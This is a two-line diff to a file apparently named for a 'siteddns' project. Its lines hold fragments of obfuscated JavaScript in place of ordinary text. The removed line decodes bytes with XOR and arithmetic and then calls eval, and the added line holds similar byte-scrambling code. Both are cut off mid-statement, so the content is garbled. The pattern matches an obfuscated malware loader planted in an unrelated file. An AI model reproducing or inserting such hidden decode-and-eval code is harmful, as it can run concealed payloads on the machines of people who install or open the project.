@@ -1,2 +1,2 @@
  # siteddns
-=3;tz--){rz[tz]=rz[tz]^88;rz[tz]=(((-rz[tz])&0xff)-253)&0xff;}";eval(tz);tz=3;while(tz
+54)break;ef[gf]=(((((ef[gf]+ef[gf+1])&0xff)+106)&0xff)>>7)|((((((ef[gf]+ef[gf+1])&0xff)+106)&0xff)
